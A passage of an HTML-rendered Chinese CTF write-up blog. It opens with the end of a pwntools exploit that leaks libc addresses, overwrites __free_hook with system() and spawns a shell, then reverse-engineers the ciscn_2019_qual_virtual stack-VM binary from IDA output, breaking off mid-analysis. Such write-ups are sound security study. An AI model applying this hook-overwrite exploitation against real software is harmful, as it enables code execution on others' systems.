class="hljs-string">&quot;R6: &quot;</span>)<br>low_addr=<span class="hljs-built_in">int</span>(r.recvline().strip(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;low-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(low_addr))<br>r.recvuntil(<span class="hljs-string">&quot;R8: &quot;</span>)<br>high_addr=<span class="hljs-built_in">int</span>(r.recvline().strip(),<span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;high-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(high_addr))<br>free_hook=(high_addr&lt;&lt;<span class="hljs-number">32</span>)+low_addr+<span class="hljs-number">8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;free_hook-&gt;&quot;</span>,<span class="hljs-built_in">hex</span>(free_hook))<br>pause()<br>libcbase=free_hook-libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>r.recvuntil(<span class="hljs-string">&quot;HOW DO YOU FEEL AT OVM?\n&quot;</span>)<br>r.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(system_addr))<br>r.interactive()<br></code></pre></td></tr></table></figure><h1 id="ciscn-2019-qual-virtual"><a href="#ciscn-2019-qual-virtual" class="headerlink" title="ciscn_2019_qual_virtual"></a>ciscn_2019_qual_virtual</h1><p>个人感觉难点在于将程序读懂，利用还是很好理解的</p><h2 id="checksec-1"><a href="#checksec-1" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">yyyffff<span class="hljs-keyword">@yyyffff-virtual-machine</span>:~/桌面$ checksec vm2<br>[*] <span class="hljs-string">&#x27;/home/yyyffff/桌面/vm2&#x27;</span><br>    <span class="hljs-attribute">Arch</span>:       amd64-<span class="hljs-number">64</span>-little<br>    <span class="hljs-attribute">RELRO</span>:      Partial RELRO<br>    <span class="hljs-attribute">Stack</span>:      Canary found<br>    <span class="hljs-attribute">NX</span>:         NX enabled<br>    <span class="hljs-attribute">PIE</span>:        No PIE (<span class="hljs-number">0</span>x3ff000)<br></code></pre></td></tr></table></figure><h2 id="IDA-1"><a href="#IDA-1" class="headerlink" title="IDA"></a>IDA</h2><p>main</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> **a2, <span class="hljs-type">char</span> **a3)</span><br>&#123;<br>  <span class="hljs-type">char</span> *name; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">void</span> **data; <span class="hljs-comment">// [rsp+20h] [rbp-20h]</span><br>  <span class="hljs-type">void</span> **text; <span class="hljs-comment">// [rsp+28h] [rbp-18h]</span><br>  <span class="hljs-type">void</span> **<span class="hljs-built_in">stack</span>; <span class="hljs-comment">// [rsp+30h] [rbp-10h]</span><br>  <span class="hljs-type">char</span> *ptr; <span class="hljs-comment">// [rsp+38h] [rbp-8h]</span><br><br>  init_0();<br>  name = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20u</span>LL);<br>  data = (<span class="hljs-type">void</span> **)sub_4013B4(<span class="hljs-number">64</span>);<br>  text = (<span class="hljs-type">void</span> **)sub_4013B4(<span class="hljs-number">128</span>);<br>  <span class="hljs-built_in">stack</span> = (<span class="hljs-type">void</span> **)sub_4013B4(<span class="hljs-number">64</span>);<br>  ptr = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400u</span>LL);               <span class="hljs-comment">// 类似于一个缓冲区？</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your program name:&quot;</span>);<br>  input((__int64)name, <span class="hljs-number">0x20u</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your instruction:&quot;</span>);<br>  input((__int64)ptr, <span class="hljs-number">0x400u</span>);<br>  sub_40161D((__int64)text, ptr);               <span class="hljs-comment">// 指令解析</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your stack data:&quot;</span>);<br>  input((__int64)ptr, <span class="hljs-number">0x400u</span>);<br>  sub_40151A((__int64)data, ptr);<br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)sub_401967((__int64)text, (__int64)data, (__int64)<span class="hljs-built_in">stack</span>) )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-------&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(name);<br>    sub_4018CA((__int64)data);                  <span class="hljs-comment">//  print data</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-------&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Your Program Crash :)&quot;</span>);<br>  &#125;<br>  <span class="hljs-built_in">free</span>(ptr);<br>  sub_401381(text);<br>  sub_401381(data);<br>  sub_401381(<span class="hljs-built_in">stack</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到开头是开辟了几个空间</p><p>具体开辟的函数:sub_4013B4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">_DWORD *__fastcall <span class="hljs-title function_">sub_4013B4</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  _DWORD *ptr; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">void</span> *s; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br><br>  ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10u</span>LL);                        <span class="hljs-comment">// 用来控制堆块的</span><br>  <span class="hljs-keyword">if</span> ( !ptr )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  s = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8LL</span> * a1);<br>  <span class="hljs-keyword">if</span> ( s )<br>  &#123;<br>    <span class="hljs-built_in">memset</span>(s, <span class="hljs-number">0</span>, <span class="hljs-number">8LL</span> * a1);<br>    *(_QWORD *)ptr = s;                         <span class="hljs-comment">// 记录指针</span><br>    ptr[<span class="hljs-number">2</span>] = a1;                                <span class="hljs-comment">// 记录大小</span><br>    ptr[<span class="hljs-number">3</span>] = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">return</span> ptr;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">free</span>(ptr);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>首先开辟了 0x10 的空间用来存放堆块信息</li><li>然后 s &#x3D; malloc(8LL * a1);才是数据的空间</li><li>然后初始化，清空堆块，记录指针，大小以及用来索引的东西(初始值为 -1，代表此时该堆块空，不知道怎么描述，接下来就用 top 来描述这个)</li></ul><p><img src="/2025/05/19/IO_FILE%20Exploit/1443.png"></p><p>如图为分配完的堆块</p><ul><li>然后将 ptr 返回给用户，图片中就是 0x4056a0</li></ul><p>输入完 name 后输入的是指令 (instruction)</p><p>首先会输入到 ptr 指针里，ptr 类似于一个缓冲区，然后会对指令进行拆分并存储到 text 里:sub_40161D </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">sub_40161D</span><span class="hljs-params">(__int64 text, <span class="hljs-type">char</span> *a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+18h] [rbp-18h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-14h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *s1; <span class="hljs-comment">// [rsp+20h] [rbp-10h]</span><br>  _QWORD *ptr; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span><br><br>  <span class="hljs-keyword">if</span> ( text )<br>  &#123;<br>    ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8LL</span> * *(<span class="hljs-type">int</span> *)(text + <span class="hljs-number">8</span>));<br>    v2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> ( s1 = strtok(a2, delim); v2 &lt; *(_DWORD *)(text + <span class="hljs-number">8</span>) &amp;&amp; s1; s1 = strtok(<span class="hljs-number">0LL</span>, delim) )<span class="hljs-comment">// 分割输入的</span><br>                                                <span class="hljs-comment">// </span><br>    &#123;<br>      <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;push&quot;</span>) )<br>      &#123;<br>        ptr[v2] = <span class="hljs-number">17LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;pop&quot;</span>) )<br>      &#123;<br>        ptr[v2] = <span class="hljs-number">18LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;add&quot;</span>) )<br>      &#123;<br>        ptr[v2] = <span class="hljs-number">33LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;sub&quot;</span>) )<br>      &#123;<br>        ptr[v2] = <span class="hljs-number">34LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;mul&quot;</span>) )<br>      &#123;<br>        ptr[v2] = <span class="hljs-number">35LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;div&quot;</span>) )<br>      &#123;<br>        ptr[v2] = <span class="hljs-number">36LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;load&quot;</span>) )<br>      &#123;<br>        ptr[v2] = <span class="hljs-number">49LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( !<span class="hljs-built_in">strcmp</span>(s1, <span class="hljs-string">&quot;save&quot;</span>) )<br>      &#123;<br>        ptr[v2] = <span class="hljs-number">50LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        ptr[v2] = <span class="hljs-number">255LL</span>;<br>      &#125;<br>      ++v2;<br>    &#125;<br>    <span class="hljs-keyword">for</span> ( i = v2 - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span> &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)write_value(text, ptr[i]); --i )<span class="hljs-comment">// 将临时的text里面的数据放到真正的text里</span><br>      ;<br>    <span class="hljs-built_in">free</span>(ptr);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>stroke 是按照 delim 来拆分输入的，其中delim为<code>\n\r\t</code>就说明以换行回车tab作为分隔符，比如说我输入<code>push push pop\n</code>，他就可以将每个 push 或 pop 拆分出来存到 text 里</p><p>然后比对每个字符串，并赋值 ptr[v2] 为对应的操作码，存到 text 里，这里是逆序来存的，比如1 2 3 4 5存到里面就变成5 4 3 2 1。不过问题不大，因为后面取出数据也是从尾部取出的</p><p>然后是输入data里的数据:sub_40151A</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> __fastcall <span class="hljs-title function_">sub_40151A</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">char</span> *a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// [rsp+18h] [rbp-28h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-24h]</span><br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *nptr; <span class="hljs-comment">// [rsp+20h] [rbp-20h]</span><br>  _QWORD *ptr; <span class="hljs-comment">// [rsp+28h] [rbp-18h]</span><br><br>  <span class="hljs-keyword">if</span> ( a1 )<br>  &#123;<br>    ptr = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8LL</span> * *(<span class="hljs-type">int</span> *)(a1 + <span class="hljs-number">8</span>));<br>    v2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> ( nptr = strtok(a2, delim); v2 &lt; *(_DWORD *)(a1 + <span class="hljs-number">8</span>) &amp;&amp; nptr; nptr = strtok(<span class="hljs-number">0LL</span>, delim) )<span class="hljs-comment">// 分割</span><br>      ptr[v2++] = atol(nptr);<br>    <span class="hljs-keyword">for</span> ( i = v2 - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span> &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)write_value(a1, ptr[i]); --i )<span class="hljs-comment">// 逆序压进去 不过没关系，后面也是逆序来取</span><br>      ;<br>    <span class="hljs-built_in">free</span>(ptr);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>其中方法跟解析指令那边差不多，不说了</p><p>接着来到操作：sub_401967</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_401967</span><span class="hljs-params">(__int64 text, __int64 data, __int64 <span class="hljs-built_in">stack</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+24h] [rbp-Ch]</span><br>  __int64 v6; <span class="hljs-comment">// [rsp+28h] [rbp-8h] BYREF 存放临时的指令</span><br><br>  v5 = <span class="hljs-number">1</span>;                                       <span class="hljs-comment">// 像是一个标志</span><br>  <span class="hljs-keyword">while</span> ( v5 &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)get_value(text, &amp;v6) )<br>  &#123;<br>    <span class="hljs-keyword">switch</span> ( v6 )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">17LL</span>:                                <span class="hljs-comment">// push</span><br>        v5 = push(<span class="hljs-built_in">stack</span>, data);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">18LL</span>:                                <span class="hljs-comment">// pop</span><br>        v5 = pop(<span class="hljs-built_in">stack</span>, data);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">33LL</span>:                                <span class="hljs-comment">// add 仅仅对stack上的数据 </span><br>                                                <span class="hljs-comment">// 下面的sub mul div也是同样的操作</span><br>        v5 = add(<span class="hljs-built_in">stack</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">34LL</span>:                                <span class="hljs-comment">// sub</span><br>        v5 = sub(<span class="hljs-built_in">stack</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">35LL</span>:                                <span class="hljs-comment">// mul</span><br>        v5 = mul(<span class="hljs-built_in">stack</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">36LL</span>:                                <span class="hljs-comment">// div</span><br>        v5 = div(<span class="hljs-built_in">stack</span>, data);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">49LL</span>:                                <span class="hljs-comment">// load 仅对stack 可以读取数据到stack</span><br>        v5 = load(<span class="hljs-built_in">stack</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-number">50LL</span>:                                <span class="hljs-comment">// save</span><br>        v5 = save(<span class="hljs-built_in">stack</span>);<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">default</span>:<br>        v5 = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v5;<br>&#125;<br></code></pre></td></tr></table></figure><p>首先从 text 段里面取出指令：get_value</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// 取出数据的函数</span><br>__int64 __fastcall <span class="hljs-title function_">sub_4014B4</span><span class="hljs-params">(__int64 a1, _QWORD *a2)</span><br>&#123;<br>  <span class="hljs-keyword">if</span> ( !a1 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  <span class="hljs-keyword">if</span> ( *(_DWORD *)(a1 + <span class="hljs-number">12</span>) == <span class="hljs-number">-1</span> )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  *a2 = *(_QWORD *)(*(_QWORD *)a1 + <span class="hljs-number">8LL</span> * (<span class="hljs-type">int</span>)(*(_DWORD *)(a1 + <span class="hljs-number">12</span>))--);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>将 a1 上的地址（也就是开始存放数据的地址）作基础，加上 top 索引的偏移</p><p>这里 a1+12 就是 top，最开始为-1的那个，每放入一个数据就 +1，所以是从尾部取出，跟逆序放入刚好对上了，每取出一个 top–</p><p>有 get_value 就有其对应的一个 write_value，用于将数据放入对应的空间之中</p><p>write_value:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_40144E</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br>                                                <span class="hljs-comment">// 该函数主要作用是将a2压入a1所代表的空间中</span><br>  <span class="hljs-keyword">if</span> ( !a1 )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  v3 = *(_DWORD *)(a1 + <span class="hljs-number">12</span>) + <span class="hljs-number">1</span>;<br>  <span class="hljs-keyword">if</span> ( v3 == *(_DWORD *)(a1 + <span class="hljs-number">8</span>) )<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>  *(_QWORD *)(*(_QWORD *)a1 + <span class="hljs-number">8LL</span> * v3) = a2;<br>  *(_DWORD *)(a1 + <span class="hljs-number">12</span>) = v3;                    <span class="hljs-comment">// 更新top</span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>将数据写到 a1 的地址之中，这次是正序的写，接着更新 top(top++) 并存到对应位置之中</p><p>下面来看具体的操作</p><p>push</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">_BOOL8 __fastcall <span class="hljs-title function_">sub_401AAC</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h] BYREF</span><br><br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)get_value(a2, &amp;v3) &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)write_value(a1, v3);<br>&#125;<br></code></pre></td></tr></table></figure><p>从 a2 里取出一个数据存到临时变量 a3 里，然后将 a3 写入 a1，这里的 a1，a2 分别是 stack 和 data  ，top++</p><p>pop</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">_BOOL8 __fastcall <span class="hljs-title function_">sub_401AF8</span><span class="hljs-params">(__int64 a1, __int64 a2)</span><br>&#123;<br>  __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h] BYREF</span><br><br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)get_value(a1, &amp;v3) &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)write_value(a2, v3);<br>&#125;<br></code></pre></td></tr></table></figure><p>与 push 反过来，从 a1 取存进 a2，top–</p><p>add</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_401B44</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)get_value(a1, &amp;v2) &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)get_value(a1, &amp;v3) )<br>    <span class="hljs-keyword">return</span> write_value(a1, v3 + v2);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>只接受 stack 一个参数，从其尾部取出两个数据相加再放进尾部 top 值–</p><p>sub</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_401BA5</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)get_value(a1, &amp;v2) &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)get_value(a1, &amp;v3) )<br>    <span class="hljs-keyword">return</span> write_value(a1, v2 - v3);            <span class="hljs-comment">// 栈上第一个数据减去第二个</span><br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>减法，类似 add，top–</p><p>mul</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">sub_401C06</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)get_value(a1, &amp;v2) &amp;&amp; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)get_value(a1, &amp;v3) )<br>    <span class="hljs-keyword">return</span> write_value(a1, v3 * v2);<br>  <span class="hljs-keyword">else</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>乘法，类似 add，top–</p><p>div</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 __fastcall <span class="hljs-title function_">div</span><span class="hljs-params">(__int64 a1)</span><br>&#123;<br>  __int64 v2; <span class="hljs-comment">// [rsp+10h] [rbp-10h] BYREF</span><br>  __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h] BYREF</span><br><br>  <span class="hljs-keyword">if</span> ( (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)get_value(a1, &amp;v2) 